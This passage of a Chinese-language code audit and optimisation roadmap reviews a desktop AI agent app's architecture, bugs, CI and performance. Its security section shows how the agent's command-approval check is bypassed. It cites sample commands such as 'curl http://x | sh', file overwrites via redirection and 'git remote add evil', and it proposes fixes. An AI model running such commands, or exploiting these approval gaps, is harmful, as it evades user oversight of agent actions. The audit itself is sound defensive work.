`db/memories.py:5,337` 注释自认 "Mirrors `app.rag_store.search_workspace`" —— 团队已知。

### 5.5 4 份"选 active 模型条目"

1. `config.py:138-148 active_model()`
2. `agent/core/llm.py:52-70 _resolve_model_entry()`（超集：支持 `::modelName` 与 `local` 虚拟条目）
3. `agent/state/compact.py:82`（内联遍历）
4. `api/settings.py:228-238`（`get_balance` 内联遍历）

常量 `DEFAULT_MODEL`/`"deepseek-flash"` 共 **9 处**字面量（`config.py:31,291`、`model_providers.py:25`、`legacy.py:28,58`、`langchain.py:230,232`、`core/llm.py:67`、`prompts.py:436`、`compact.py:87,113`）。

### 5.6 图片/文档扩展名表重复

- `file_types.py:9 VISION_IMAGE_EXTENSIONS` == `api/files.py:23 _IMAGE_SUFFIXES`（集合完全相同）
- `api/files.py:163 _PPTX_PREVIEW_SUFFIXES` == `tools/scripts/pptx_to_png.py:28 _SOURCE_SUFFIXES`
- `tools/office_files.py:18-22` 另有一套

### 5.7 api/ 层：业务与基础设施混住

| 文件 | 行 | 端点 | 问题 |
|---|---|---|---|
| `chat.py` | 988 | 5 | **`stream_chat()` 单 handler 592 行**（`chat.py:198-789`）：附件抽取 + mention 上下文 + 本地/云端路由 + preprocess + SSE 生成 + 落库 + 标题生成 |
| `workspace_files.py` | 537 | 2 | **14 个 helper**：完整模糊搜索/索引服务住在 api（`_scan:212`、`_score:312`、`_scan_skills:384`…） |
| `chat_local.py` | 463 | **0** | **假 router**：无任何 `@router`，是被 `chat.py:36-37` 反向引用的逻辑模块 |
| `local_llm.py` | 321 | 11 | 11 处 `except Exception` 全部翻译成 **200 + error 字段**（语义错误） |
| `mention_skills.py` | 247 | **0** | **假 router** |
| `terminal.py` | 239 | 1 | PTY 全套（`_spawn_shell:71`、`_kill_process:98`、`_reader:108`）住在 api |

**api 内部互相耦合**：`chat.py:36` → `mention_skills`、`:37` → `terminal`、`:38` → `workspace_files`；`workspace_files.py:156 ensure_within`（路径越权校验，安全关键）被当公共工具导出。

### 5.8 db/ 层

**主范式健康**（14/17 仓储统一 `with get_conn()` + `dict(row)`），但：

| 问题 | 位置 |
|---|---|
| **嵌套事务会提前提交外层**（代码自述） | `history.py:446-450` 注释："list_message_parts opens its own get_conn() transaction on the shared connection, so calling it inside the with block would commit the outer transaction" → **靠"把调用挪出 with 块"的约定，非机制保障** |
| **N+1 查询** | `history.py:449` 对每条消息逐个 `list_message_parts` |
| 无 `busy_timeout` | `connection.py:36` 仅 `sqlite3.connect(timeout=10.0)`，WAL 下仍有 SQLITE_BUSY 风险，无重试 |
| **DDL 分散三处** | `migrations.py`(11 表) + `fts.py:51`(第 2 个 FTS 虚表) + `rag_store.py:20`(2 表) |
| 无版本表 | `init_db` 靠 `PRAGMA table_info` 探测 + `ALTER TABLE`，"探测式演进"，无 `user_version` |
| schema 层反向依赖 | `migrations.py:5 from .projects import default_project` |
| 门面不完整 | `db/__init__.py` 遗漏 `fts`/`fts_query`/`retrieval` |
| **测试严重不匹配** | **`test_db_repositories.py` 仅 2 个测试守护 17 个仓储模块**；`sessions/messages/memories/projects/todos/scheduled_tasks/task_runs/calendar_events/summaries/usage` 共 10 个零直接覆盖 |

### 5.9 llm/ 层：`legacy.py` 是真实的第二套 provider

| 事实 | 证据 |
|---|---|
| 569 行（占 llm/ 43%），其中 **427 行是 `MockLLM`**（测试替身） | `legacy.py:17 DeepSeekLLM`（裸 httpx 流式）+ `:143 MockLLM` |
| **仍在生产使用** | `docgen/pdf/engine.py:11,156-157` → PDF 生成走**非 LangChain 实现** |
| 主 provider 复用 legacy 的 mock 逻辑 | `langchain.py:15,126` `MockLLM._answer(...)` |
| 优质部分（无重复，勿动） | `dsml.py`（DSML 解析，被 legacy+langchain 共用）、`think_tags.py`（被 3+ 模块用）、`thinking.py` |

**注意**：`DeepSeekLLM` 与 `ChatDeepSeekProvider` 都在做 DeepSeek 流式 + DSML + thinking，前者裸 httpx、后者 LangChain。**这是真正的重复实现**，删除阻力是 `tests/test_pdf_page_templates.py` 6 处 `MockLLM` 断言。

### 5.10 测试：约 2,900 行基础设施无直接测试锚点

| 模块 | 行数 | 风险 |
|---|---|---|
| **`skill_lib/github.py`** | **529** | **零测试**，含网络下载、tar 解包、**路径逃逸防护**（`_safe_relative:263`、`_is_within`）、子进程 clone |
| `api/chat_local.py` | 463 | 0（间接经 chat） |
| `db/migrations.py` | 395 | 1（仅经 fts 用例触发） |
| `db/fts.py` | 307 | 1 |
| `api/workspace_files.py` 索引段 | ~300 | 文件级 2 |
| `api/terminal.py` | 239 | 1（仅 decide 路径，PTY/WebSocket 无覆盖） |
| **`rag_store.py`** | 231 | **0**（且含 §4.2 的 bug） |
| `api/git.py` | 145 | 0 |
| `document_reader.py` | 135 | 0 直接 |

---

## 6. 前端（29,184 行）与 Tauri 壳（1,704 行）

### 6.1 已做好的部分（避免重复优化）

- **虚拟滚动**：`MessageList/index.tsx:68` `useVirtualizer` + `overscan:12` + `useFlushSync:false`（有注释解释 React commit 期报错规避）
- **流式渲染三重优化**：`hooks/streamBuffer.ts`（rAF 合帧，注释明确为消除 O(n²)）、`fenceScan.ts`（增量围栏扫描）、`MarkdownView/index.tsx:148-161`（已闭合块冻结，每帧只重解析活动尾块）
- **重库全懒加载**：shiki(`HighlightedCode.tsx:57`)、echarts(`ChartBlock/index.tsx:92`)、mermaid(`MermaidBlock.tsx:92`)、X6+antv(`GraphRenderer.ts:140`)
- **12 处 `React.memo`** + 热路径 props 稳定性注释
- **Rust 零 `unwrap()`**（生产仅 2 处 `expect()`：`lib.rs:253` 构建失败、`sidecar.rs:75` 编译期常量）
- **services 层干净**：`invoke(` 全部收口于 `services/tauri.ts`（17 个）；`EventSource` 仅 `services/events.ts:41`；SSE 解析仅 `services/sse.ts` 一处（`useChatStream` 正确复用，无重复实现）

### 6.2 🔴 两个真实缺陷（P0）

**Bug ①：`SkillsPage` 漏传 `workspacePath` → 项目级技能永不加载**

```tsx
// chat/index.tsx:850 —— 从未传 workspacePath
<SkillsPage onOpenSidebar={() => setSidebarOpen(true)} />
```
`pages/skills/index.tsx:44` 用它调 `reloadSkills(workspacePath ?? undefined)`。ChatPage 手上就有 `currentProject?.path`。**修复：1 行。**

**Bug ②：切视图卸载 `ChatInput` → 草稿/附件/@提及全丢**

```tsx
// chat/index.tsx:847-851 —— ChatInput 在三元表达式第三分支内
{tasksOpen ? <ScheduledTasksPage/> : skillsOpen ? <SkillsPage/> : (
  <ChatStreamContext.Provider ...>
    <ChatInput key={composerKey} ... />   {/* 切视图即卸载 */}
```
`ChatInput` 的 `value`(草稿 `:129`)、`attached`(附件 `:130`)、`mentions`(提及 `:131`) 随卸载销毁；`MessageList:873` 同时卸载，滚动位置丢失。**最小修复**：三视图改 CSS 隐藏（约 60 行）或输入态提升。

### 6.3 结构性问题

| 问题 | 证据 | 影响 |
|---|---|---|
| **上帝组件** | `pages/chat/index.tsx` 994 行 / **53 个 hook 调用**（10+ useState + 10 useEffect + 22 useCallback + 7 useMemo + 4 useRef），兼任 CRUD 控制器、SSE 持有者、视图路由、快捷键、Git 探测、6 弹窗开关、布局状态机 | 无法单测、改一处易连带回归 |
| **skills/tasks 不是路由** | `app/router.tsx:26-30` 只有 `/chat`；其余靠 `?view=` 三元切 | 直接导致 Bug ② |
| **`state/` 名不副实** | 7 文件里 4 个（`configStore`/`inputStore`/`messageStore`/`fullscreenStore`）实为 `useState` 打包，各仅被 ChatPage 调用一次；只有 `sessionEffort`/`sessionModel` 是真模块级 store | 误导新人 |
| **无 ErrorBoundary** | 全 src 搜 0 命中 | 渲染异常直接白屏 |
| **错误处理三套并存** | ① 静默吞 `.catch(() => undefined)`（`chat/index.tsx` 6 处）② Toast（28 处/14 文件）③ 内联 error state | 无统一策略；91 处 catch |
| **`request.ts` 类型撒谎** | `:112` `throwOnError:false` 时 `return undefined as T` | 未爆的雷（当前无调用方） |
| **取消模式 4 种** | AbortController Map(`useChatStream:106`)、手写 id 计数器(`index.tsx:737`)、序号(`useSessionLoader`)、`mentionAbortRef`(`ChatInput:112`) | 无统一抽象 |
| **主题双真相源** | `settings`（后端）vs `theme`（localStorage + CustomEvent `services/theme.ts:28`） | 不一致窗口 |
| **Rust 命令注册无保护** | `lib.rs:226-251` 手工 `generate_handler!` 26 条 | 漏加则编译通过、运行时 "command not found" |

**Prop drilling 反而没问题**：最深链路 2 层（`ChatPage → MessageList → MessageItem`），`MessageItem` 只接 9 个 props 且无转发。

**状态库结论：不需要 zustand/jotai**——唯一页面是 ChatPage，"跨页面共享"实际不存在；项目已有正确范式（`services/updater.ts:38-62` 的 `useSyncExternalStore` 20 行极简 store）。真痛点是组件太大。

### 6.4 前端性能真问题

| # | 问题 | 数据 |
|---|---|---|
| PP1 | **首屏入口 chunk 1.12 MB / gzip 349 KB**，含全部 3 个语言包（112 KB raw，用户只用 1 份）+ lucide 全量图标 | `dist/index.html:7` 直接引入 |
| PP2 | `events.ts` 常驻 EventSource 无订阅级去抖 | `sessions_changed` 高频广播 → 连续全量重拉会话列表 |
| PP3 | `tasks/index.tsx:91-102` `refresh()` 无去抖 + 串行 4 步（含系统日历同步）；`TaskRow` 未 memo | 事件到达即触发 |
| PP4 | shiki 静态注册 35 语言 → 2.74 MB chunk（gzip 339 KB） | 多数会话只用 3-5 种 |
| PP5 | `ConversationMinimap` 流式期间每帧重算 | 接收 `messages`（每 chunk 变） |
| PP6 | `vite.config.ts` 无 `manualChunks` | 分包靠 rolldown 自动切分 |

### 6.5 Tauri 壳：sidecar 生命周期 4 个缺口

| # | 缺口 | 证据 | 后果 |
|---|---|---|---|
| 1 | **无 Drop / kill_on_drop** | `services/sidecar.rs:14` `SidecarState(Mutex<Option<Child>>)`，无 Drop impl | 应用被 SIGKILL/panic → Python 成孤儿占 8019；下次启动 `port_open()` 为真 → **直接复用旧版 sidecar**（`:101-104`），升级后新旧版本混跑 |
| 2 | **探活 = TCP connect**（300ms） | `sidecar.rs:72-77` | 无法区分"我们的 sidecar"/"别的进程占端口"/"事件循环卡死但 backlog 仍 accept" |
| 3 | **停止 = SIGKILL** | `sidecar.rs:156` `child.kill()` | 后端无法 flush WAL、无法取消在跑回合、无法写检查点（而 `useChatStream.ts:579` 注释明确依赖"持久化部分内容"） |
| 4 | **监控线程可重复启动** | `commands/sidecar.rs:6-8` `start_sidecar` 直调 `spawn_and_monitor`，而 `lib.rs:202` 已调过一次，无幂等守卫 | 两线程竞争 `spawn()` → 双进程/端口争抢 |

其他：`stdio` 全 `null`（`sidecar.rs:113-114`）→ 后端崩溃前 traceback 不可见；CSP `connect-src` 硬编码 8019，与 Rust 常量、`.env` **三处独立定义**。

### 6.6 前后端契约：三处手写、零校验

```
后端裸 dict（sse_event("tool", {...}) / _custom_sse 动态 event_name）
   ↓ 无模型（schemas.py 只管请求体，SSE 事件完全裸 dict）
前端 SSEHandlers interface（services/sse.ts:10-28，11 个事件）
   ↓ 又内联重写一遍
useChatStream.ts:134-325 buildStreamHandlers → 5 处 `as unknown as`（:151,161,169,190,225）
```

**运行时校验完全缺失**：无 zod/valibot/io-ts/yup；仅零散 `typeof`（`MessageHelpers.tsx:284-330` 6 处）。

**实际风险**：后端把 `sub_id` 改成 `subagent_id` → 编译器全程沉默 → 运行时"子代理面板永远空白"。

同类：`types.ts` 630 行单文件，`ToolEvent` 75 行超宽接口（20+ 工具字段平铺，无判别联合）；Rust↔TS 手写镜像（无 `ts-rs`/`specta`），`save_paste_text` Rust 返回 `serde_json::Value`、TS 手写 interface；26 个 Rust 命令错误类型全为 `Result<T, String>`。

---

## 7. 工程化与 CI

| 项 | 现状 | 问题 |
|---|---|---|
| **CI 测试** | `.github/workflows/build.yml` 仅 `push: tags: v*` + 手动触发；步骤 = install → build sidecar → `pnpm tauri build` | **117 个测试文件 / 1,295 个测试零 CI 覆盖**；日常提交与 PR 无任何门禁 |
| **CI lint** | 无 | `pnpm lint`/`format:check`/`i18n:check`（脚本已存在）均未接入 |
| **Python 版本** | CI `3.11`；**本地实测 3.14.7** | 开发/构建环境不一致 |
| **依赖锁定** | `requirements.txt` 宽松范围（`fastapi>=0.111,<1`） | 无 lock，依赖漂移 |
| **前端测试** | **零**（无 vitest/jest/playwright/@testing-library，39 个依赖零测试工具） | 29k 行前端无自动化测试 |
| **前端 lint** | ✅ flat config + prettier + husky；但 5 条 react-hooks 新规则降级 warn（~34 处已知违反，**有注释记录，属团队主动决策**） | pre-commit 只查暂存文件、不跑 tsc/测试；hooks 靠 `pnpm install`（`prepare` 用 `\|\| true` 吞失败） |
| **后端 lint** | ✅ `ruff.toml`（select E/F） | **21 个错误未清理**（含 1 个真实缺陷） |
| **后端类型检查** | 无 mypy/pyright | 无静态门禁 |
| **Rust 测试** | 7 个，仅 `workspace.rs:625` diff 相关；注释坦白"此前 6 个用例一直没跑过"（Future `.expect()` 致 test target 编译不过） | 覆盖面极窄 |
| **版本号** | 4 处一致（均 `0.2.1`） | 靠手工同步 |

---

## 8. 缺陷清单（本轮实测）

### 8.1 🔴 安全缺陷（最高优先级，实测确认）

| 严重度 | 缺陷 | 位置 | 实测证据 |
|---|---|---|---|
| 🔴 **S1** | **`format_code` 是完整审批旁路** | `agent/tools/execution.py:27,667-670,789` + `tools/adapters/format_code.py:129` | `_COMMAND_TOOLS = {"lint_check","run_tests"}` **不含 `format_code`**，但 `format_code` 实现了 `build_command` 且接受**任意 `command` 参数**（`format_code.py:46-49`）→ `is_terminal=False` → `policy = terminal_command_policy(cmd) if is_terminal else "safe"` → **策略函数根本没被调用**。实测 `curl http://x \| sh` 本应 `confirm`，经此路径免确认执行。**子 Agent 侧同样漏**（`subagents.py:298` 只判 `name=="terminal"`，而其 `:83-84` 注释恰恰声称"已走策略"）。**修法 2 行** |
| 🔴 **S2** | **`terminal_policy` safe 档过宽** | `tools/terminal_policy.py:61-101` | 实测分类：`echo evil > src/main.py` → **safe**（`_SHELL_CONTROL_RE:73` 漏 `>`/`>>`/`<` → 可静默覆写工作区文件）；`python3 -c 'open("a.py","w").write("x")'` → **safe**（解释器白名单 = 任意代码执行）；`git branch -D main` / `git remote add evil https://x` / `git stash drop` → **safe**（git 白名单只看第二个词，不查 flag）。仅 `rm -rf /` 正确 block |
| 🟠 **S3** | **MCP 审批卡不显示参数** | `agent/tools/execution.py:657-663,862-870` | 卡片只显示 `mcp:<server>.<tool>`，用户**盲签**；`trusted` server 更是全自动（对比 terminal 工具会给完整命令） |
| 🟠 **S4** | **插件零来源校验** | `tools/registry.py:121-151` | `data/plugins/*.py` 以服务同等权限执行（可读写任意文件、起子进程、读 `settings.json` 密钥）。无签名、无白名单 |
| 🟠 **S5** | **进程内工具超时是"假超时"** | `tools/base.py:331` | 实测：注入 `sleep(3)` 的假 `run_tool`，外层 `wait_for(0.5)` 已返回超时，**工作线程仍存活**并在 3 秒后自行完成。当前 6 个内联工具都是只读所以未出事，但语义陷阱成立 |

### 8.2 功能/正确性缺陷

| 严重度 | 缺陷 | 位置 | 说明 |
|---|---|---|---|
| 🔴 P0 | **`Any` 未定义** | `tools/adapters/pdf_form_generate.py:109` | ruff `F821`；因 `from __future__ import annotations` 不立即崩，但类型注解失效 |
| 🔴 P0 | **`SkillsPage` 漏传 `workspacePath`** | `pages/chat/index.tsx:850` | 项目级技能永不加载 |
| 🔴 P0 | **切视图丢草稿** | `pages/chat/index.tsx:847-851` | ChatInput 卸载致草稿/附件/@提及丢失 |
| 🔴 P0 | **`create_plan` 死注册** | `agent/tools/tools.py:133`（显式 `continue` 跳过）+ `execution.py:268,281` 仍指示模型调用 | adapter + `scripts/plan.py` + 子进程通道全为死代码；prompt 侧靠 `replace("create_plan","write_todos")`（`prompts.py:475`）掩盖 |
| 🟠 P1 | **agent/monitor/reminder 不写 `task_runs`** | `tasks/common.py:163` 仅被 3 个新类型调用 | 执行历史静默缺失，无测试断言 |
| 🟠 P1 | **插件部分注册残留** | `tools/registry.py:144` | 模块名在 `exec_module` **之前**加入 `_LOADED_PLUGINS`，且无回滚 → 插件先注册工具 A 再抛异常时 A **永久残留**为"半初始化活工具"，`added/total` 计数也不一致 |
| 🟠 P1 | **`rag_store._schema_ready` 进程级全局** | `rag_store.py:38-42` | DB 路径切换后新库永不建表 |
| 🟠 P1 | **`TerminalAdapter` 单例竞态** | `tools/adapters/terminal.py:110` `self.timeout = ...` 改的是 registry 单例 | 并发会话互相干扰：A 设 600s 后 B 设 60s 会把 A 的内层子进程超时降到 60s，表现为莫名提前超时 |
| 🟠 P1 | sidecar 孤儿进程 / 复用旧版 | `services/sidecar.rs:14,101-104` | 见 §6.5 |
| 🟠 P1 | 简历 PDF 无降级无 QA | `docgen/resume/templates/__init__.py:136-138` | 见 §3.3 |
| 🟠 P1 | reportlab 路径静默丢 SVG | `docgen/pdf/renderer/reportlab.py:13-24` | 见 §3.3 |
| 🟡 P2 | `local_llm.py` 11 处异常翻译成 HTTP 200 | `api/local_llm.py:66,88,117,192,205,241,260,286,307,320` | 语义错误，前端无法区分成功/失败 |
| 🟡 P2 | **`docs/plugins.md` 描述不存在的东西** | `docs/plugins.md:47-48` | 声称"插件重载接口""API 层预留"、参考 `data/plugins/example_hello.py` —— **三者均不存在**（`data/plugins/` 实测只剩 `__pycache__`） |
| 🟡 P2 | 死代码 | `scheduler.py:144-149`；`schemas.py:129,138`；`pdf/renderer/markdown.py:407`；`tools/templates/`（空目录且未被 git 跟踪） | 含"为死代码写测试" |
| 🟡 P2 | ruff 其余 20 项 | `app/**` | 未使用 import(14)、未使用变量(2)、f-string(1) 等，17 项可 `--fix` |

### 8.3 结构性根因：6 处手写名字集合零成员校验

**79 个工具**与 **6 处硬编码集合**之间**没有任何成员校验**：

| 集合 | 位置 |
|---|---|
| `_READ_ONLY_TOOLS` | `agent/core/constants.py:56-82` |
| `_NO_PLAN_TOOLS` | `agent/core/constants.py:84-103` |
| `_LOCK_FREE_TOOLS` | `agent/tools/tools.py:43-45` |
| `_CONTENT_TOOLS` | `agent/tools/tools.py:47-90` |
| `_COMMAND_TOOLS` | `agent/tools/execution.py:27` |
| `_EDIT_TOOLS` / `_OFFICE_EDIT_TOOLS` | `agent/tools/execution.py` |

**这一个缺陷同时生产了四类问题**：审批旁路（S1）、死注册（`create_plan`）、25/79 工具测试盲区、策略消费端缺失（S2 影响面）。即使人工修正 S1/S2，只要集合仍靠手写维护，漂移就会复发——**根本解是加注册表不变量测试**（§10 第一批）。

---

## 9. 性能基线（实测）

| 指标 | 实测值 | 说明 |
|---|---|---|
| 后端导入 `app.main` | **0.45s** | 重依赖已惰性化 |
| 非打包启动（`python run.py`） | **0.9s** | 应用逻辑本身很快 |
| **打包二进制冷启动** | **7.0s** | 差值 6.1s = PyInstaller **onefile** 自解压 |
| 二进制体积 | **113.6 MB** | 未压缩 331.6 MB / 8,120 文件 |

**体积构成（未压缩 top 10）**

| 包 | 大小 | 可优化性 |
|---|---|---|
| `llama` | 79.22 MB | 本地模型二进制；**若非常驻可改按需下载** |
| `pymupdf` | 50.37 MB | PDF 必需 |
| `lxml` | 17.21 MB | bs4 依赖 |
| `PIL` | 12.42 MB | 必需 |
| `cryptography` | 11.63 MB | 传递依赖 |
| `numpy` | 10.16 MB | 传递依赖 |
| `sqlalchemy` | 7.45 MB | **项目用原生 sqlite3，此依赖可疑** |
| `anydoc` | 6.83 MB | 文档解析 |
| `langchain_community` | 6.15 MB | **946 文件，仅用 document_loaders 子集** |
| `openai` | 5.87 MB | **1,490 文件**（langchain_openai 传递） |

---

## 10. 优化路线图

### 第零批：安全修复（合计 <150 行，建议立即做）

| # | 动作 | 改动量 | 风险 |
|---|---|---|---|
| **S-1** | **修 `format_code` 审批旁路**：把 `format_code` 加入 `_COMMAND_TOOLS`（`execution.py:27`）；子 Agent 侧判定改为 `name == "terminal" or name in _SUBAGENT_COMMAND_TOOLS`（`subagents.py:298`） | **2 行** | 低 |
| **S-2** | **收紧 `terminal_policy` safe 档**：`_SHELL_CONTROL_RE` 加 `>`/`>>`/`<`；`git branch/tag/remote/stash` 一律 `confirm`；解释器含 `-c`/`-e` 时 `confirm` | ~20 行 | 中（体验取舍，建议分两步：先加重定向与 git，再评估解释器） |
| **S-3** | **加注册表不变量测试**：参数化 6 条 —— `script_name` 存在、`hasattr(build_command) ⇒ in _COMMAND_TOOLS`、`allow_external_paths ⇒ override external_paths`、6 个白名单集合 ⊆ `registry.names()`、工具名唯一且 `required ⊆ properties`、schema 总字符 < 阈值 | ~120 行 | 低。**投入产出比最高**：会立刻抓出 `create_plan` 死注册与 schema 膨胀 |
| **S-4** | 修插件部分注册残留 + `_LOADED_PLUGINS` 时序（`registry.py:144`） | ~10 行 | 低 |
| **S-5** | MCP 审批卡加 `arguments_preview`（复用 `tool_runtime.py:23-30`，注意脱敏） | 小 | 低 |

### 第一批：缺陷修复 + 零风险门禁（1-2 天，全部低风险）

| # | 动作 | 改动量 |
|---|---|---|
| 1 | 修 3 个 P0 业务缺陷（`Any` / `workspacePath` / 草稿丢失） | ~65 行 |
| 2 | 删 `create_plan` 死注册并修 prompt 文案（`prompts.py:475` 的 `replace` 掩盖） | 小 |
| 3 | 清 ruff 21 项（17 项 `--fix`） | 小 |
| 4 | **CI 加门禁**：触发扩到 `pull_request`+`push:main`，插 `ruff check` + `pytest` + `pnpm lint` + `format:check` + `tsc` + `pnpm test` | ~20 行 YAML |
| 5 | 统一 Python 版本（CI 与本地取一） | 1 行 |
| 6 | 前端接入 vitest + 补纯函数测试（`chatUtils`/`fenceScan`/`sse.handleEvent`/`messagesToChatMessages` 等 12 项优先） | 1-2 天 |
| 7 | 删死代码（`_mark_reminder_due`、2 个死 schema、`_markdown_to_html` + 其测试、14 个死导出、rag shim、空 `tools/templates/`） | -150 行 |
| 8 | 修 `docs/plugins.md` 中不存在的功能描述；补 `data/plugins/example_hello.py` 或删除相关说明 | 小 |
| 9 | spec `datas` 排除 `__pycache__`（改显式 glob `*.py`）；`graph_ir.schema.json` 加入 datas 或从仓库删除 | ~5 行 |
| 10 | 补 5 个高危副作用工具测试（`sqlite_query` 拒 DROP/ATTACH、`undo_last_turn`、`schedule_task`/`write_calendar` 审批落库、`install_skill` 本地 fixture） | 中 |

### 第二批：契约与健壮性（3-5 天）

| # | 动作 | 改动量 | 风险 |
|---|---|---|---|
| 7 | **SSE 事件单一契约源**（判别联合），消除 5 处 `as unknown as` | ~120 行 | 低（纯类型） |
| 8 | 后端补 SSE 事件 Pydantic 模型 + 测试断言事件名白名单 | ~300 行 | 中 |
| 9 | sidecar 四缺口（Drop/kill_on_drop + HTTP 探活 + SIGTERM + 监控幂等） | ~105 行 | 低-中 |
| 10 | 加 `<ErrorBoundary>` + `request.ts` 结构化错误 | ~70 行 | 极低 |
| 11 | 首屏优化：i18n 按需（-23KB gzip）+ `manualChunks` | ~40 行 | 低 |
| 12 | 修 `rag_store._schema_ready` + 补其测试 | 小-中 | 中 |
| 13 | 合并两套 SSE 序列化（`events.py:50` + `sse.py:7`） | ~20 行 | 低 |
| 14 | 统一"选 active 模型"到 `_resolve_model_entry`（消除 4 份拷贝） | ~40 行 | 低-中 |
| 15 | `interactive` 票据落库（消除重启丢票 + 卡片残留） | 中 | 中 |

### 第三批：结构重整（2-4 周）

| # | 动作 | 改动量 | 风险 |
|---|---|---|---|
| 16 | **修 agent core 不变量**：`prompts.py` 提为顶层 `prompt_hub`；`orchestrator → api.terminal` 下沉；`tools/execution.py:22` 改直连 | 小-中 | 中 |
| 17 | 合并 scheduler/tasks 双头执行路径 + 让 5 种类型都写 `task_runs` | 中 | 中 |
| 18 | **拆 `_handle_adapter_call`（1,013 行）** 为编排薄壳 + 按工具族的 handler | 大 | 中 |
| 19 | 拆 `pages/chat/index.tsx`（994 行 / 53 hooks） | 中大 | 中 |
| 20 | skills/tasks 提为真路由 + 输入态提升 | 中大 | 中高 |
| 21 | **docgen 建共享层**：`docgen/theme/`（颜色+主题 id 单一源）、`docgen/common/`（markdown 配置/html_to_pdf/svg_raster） | 中大 | 中 |
| 22 | docgen 低风险清理：合并 t18/t19、拆 sample_pages/layouts | 小-中 | 低 |
| 23 | `config.py` 拆 core/{config,settings,models} + 门面 | ~450 行 | 中 |
| 24 | `rag_store` 复用 `db/retrieval` + DDL 迁入 migrations | ~190 行 | 中 |
| 25 | 本地模型管理迁出 `agent/core` → `app/local_runtime/` | ~1,430 行 | 中 |
| 26 | 建立 `agent/api.py` 显式公开面，统一 40 处 app/ 导入 | 小 | 低 |
| 27 | 统一工具注册：内置工具也走目录扫描 + spec `collect_submodules` | 中 | 中 |
| 28 | 字体资源打包 + 消除 4 处硬编码路径 | 中 | 中（需视觉快照） |
| 29 | 清理兼容 shim（`skills.py`/`github_skills.py`/子包 re-export 只留公共名） | 中 | 中 |

### 明确不建议

- ❌ **引入 zustand/jotai**：不存在跨页面高频共享状态；项目已有 `useSyncExternalStore` 正确范式。真痛点是组件太大。
- ❌ **docgen 合并更少子包**：边界合理，缺的是共享层。
- ⚠️ **onefile → onedir**：能把启动从 7s 降到预计 2-3s，但改变 Tauri `externalBin` 分发形态，需单独评估。

---

## 附：与上一轮评审的对比

上轮（`docs/optimization-feasibility-analysis.md`）建议的"快速收益 5 项"核对：

| 上轮建议 | 当前状态 |
|---|---|
| PRAGMA cache_size 调大 | ❌ 未做（`db/connection.py` 仍无 cache_size，且**也无 busy_timeout**） |
| SSE 批量发送（50ms 攒批） | ❌ 未做 |
| 统一错误码 | ❌ 未做 |
| API Key 加密存储 | ❌ 未做（仅上轮 chmod 600 生效） |
| 工具执行进度条 | ⚠️ 基础设施在（`supports_progress`），仅 web_fetch_batch 使用 |
| 日志脱敏 | ❌ 未做（无 `app/security/`） |

**观察**：过去这段时间重心在**功能扩张**（docgen 域、tasks 子系统、MCP、工具图、GraphBlock），技术债与新增架构问题同步累积（4 组环、巨型函数、契约漂移、双头治理）。**建议本轮的"第一批"优先落地**，避免复利。
